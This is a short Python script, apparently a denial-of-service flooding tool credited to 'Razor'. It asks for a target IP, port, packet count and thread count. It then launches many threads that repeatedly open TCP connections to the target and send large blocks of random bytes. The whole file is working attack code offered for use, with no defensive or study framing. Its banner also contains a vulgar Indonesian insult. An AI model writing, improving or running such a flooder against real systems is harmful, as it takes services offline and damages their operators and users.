# Coding Time By Razor
# Tools Usage By : Razor
# Tools Credit By : Razor
# Don't Leak Your Tools Now !!!
# Don't Abuse Now !!!

# Import Module
import random
import socket
import threading
# Info Tools [ MSA Tools]
print("------------------------------------------------")
print("[+] Tools Used By : RazoR")
print("[+] Credit Tools : RazoR")
print("[+]Jangan Leak Ya Kontol")
print("------------------------------------------------")

ip = str(input("[/] Enter RDP IP : "))
port = int(input("[/] Enter RDP Port (80)   : "))
times = int(input("[/] Enter Packet : "))
threads = int(input("[/] Enter Thread (90048) : "))

def run():
    data = random._urandom(90048)
    i = random.choice(("[*]","[!]","[#]","[†]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Sent!!!")
        except socket.error:
            s.close()
            print("[†] Attacking => ",ip," With Port : ",port,"!")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()